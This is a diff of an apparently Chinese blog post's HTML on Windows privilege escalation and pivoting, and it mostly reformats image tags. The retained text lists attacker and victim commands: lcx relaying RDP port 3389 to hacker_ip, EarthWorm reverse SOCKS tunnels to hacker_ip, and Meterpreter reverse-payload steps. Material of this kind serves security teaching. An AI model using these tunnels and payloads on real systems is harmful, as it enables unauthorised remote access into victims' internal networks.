@@ -85,11 +85,12 @@
                     <div style="padding:5px 5px 2px 0px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>2016-08-08</time>
-                    </div>
+                        &nbsp;&nbsp;&nbsp;&nbsp;
+                    
 
                     
 
-                    <div style="padding:2px 5px 5px 0px;">
+                    
                         
                         
                         
@@ -145,32 +146,13 @@
 <ul>
 <li>Hacker：lcx.exe -listen 500 8888</li>
 <li>Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389</li>
-<li>Hacker：cmd mstsc hacker_ip:500
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx.png">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx.png">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接.png">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功.png">
-</div>
-</li>
+<li>Hacker：cmd mstsc hacker_ip:500</li>
 </ul>
+
+<p><img src="/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx" />
+<img src="/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx" />
+<img src="/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接" />
+<img src="/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功" /></p>
 
 <h3 id="0x04-earchworm端口转发">0x04 EarchWorm端口转发</h3>
 
@@ -178,95 +160,42 @@
 <li>Hacker：./ew -s rcsocks -l 1080 -e 8888</li>
 
 <li><p>Victim：./ew -s rssocks -d hacker_ip -e 8888
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_earchworm.png" alt="earchworm原理.png">
-</div>
-</p>
+<img src="/img/post/privilge_escalation_win_earchworm.png" alt="earchworm原理" /></p>
 
 <h4 id="1-启动earchworm">1. 启动EarchWorm</h4>
 
-<p>
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_linux_run_ew.png" alt="hacker服务器启动ew.png">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_victim_run_ew.png" alt="victim启动ew.png">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_linux_get_victim_conn.png" alt="victim连接hacker服务器.png">
-</div>
-</p>
+<p><img src="/img/post/privilge_escalation_win_linux_run_ew.png" alt="hacker服务器启动ew" />
+<img src="/img/post/privilge_escalation_win_victim_run_ew.png" alt="victim启动ew" />
+<img src="/img/post/privilge_escalation_win_linux_get_victim_conn.png" alt="victim连接hacker服务器" /></p>
 
 <h4 id="2-hacker主机使用代理">2. hacker主机使用代理</h4>
 
-<p>
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_hacker_set_proxy1.png" alt="hacker内网主机设置代理1.png">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_hacker_set_proxy2.png" alt="hacker内网主机设置代理2.png">
-</div>
-</p>
+<p><img src="/img/post/privilge_escalation_win_hacker_set_proxy1.png" alt="hacker内网主机设置代理1" />
+<img src="/img/post/privilge_escalation_win_hacker_set_proxy2.png" alt="hacker内网主机设置代理2" /></p>
 
 <h4 id="3-hacker内网主机连接目标的内网主机">3. hacker内网主机连接目标的内网主机</h4>
 
-<p>
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_ew_hacker_remote_conn.png" alt="hacker连接内网主机.png">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png" alt="hacker连接内网主机成功.png">
-</div>
-</p></li>
+<p><img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn.png" alt="hacker连接内网主机" />
+<img src="/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png" alt="hacker连接内网主机成功" /></p></li>
 </ul>
 
 <h3 id="0x05-meterpreter">0x05 Meterpreter</h3>
 
 <ul>
-<li>Hacker端生成payload
+<li><p>Hacker端生成payload
+<img src="/img/post/privilge_escalation_win_msf_creat_payload.png" alt="msf生成win反弹型的payload" /></p></li>
 
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_msf_creat_payload.png" alt="msf生成win反弹型的payload.png">
-</div>
-</li>
-<li>msf监听端口
+<li><p>msf监听端口
+<img src="/img/post/privilge_escalation_win_set_metasploit_listen_port.png" alt="设置metasploit监听端口" /></p></li>
 
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_set_metasploit_listen_port.png" alt="设置metasploit监听端口.png">
-</div>
-</li>
-<li>目标主机运行exp
+<li><p>目标主机运行exp
+<img src="/img/post/privilge_escalation_win_victim_run_exp.png" alt="目标主机运行exp" /></p></li>
 
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_victim_run_exp.png" alt="目标主机运行exp.png">
-</div>
-</li>
-<li>msf收到新会话
+<li><p>msf收到新会话
+<img src="/img/post/privilge_escalation_win_msf_get_conn.png" alt="msf收到目标主机的连接" /></p></li>
 
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_msf_get_conn.png" alt="msf收到目标主机的连接.png">
-</div>
-</li>
-<li>msf执行命令
-
-<div class="pure-u-1">
-  <img class="pure-img border_img" src="/img/post/privilge_escalation_win_msf_exec_command.png" alt="msf远程执行命令.png">
-</div>
-</li>
+<li><p>msf执行命令
+<img src="/img/post/privilge_escalation_win_msf_exec_command.png" alt="msf远程执行命令" /></p></li>
 </ul>
 
                 
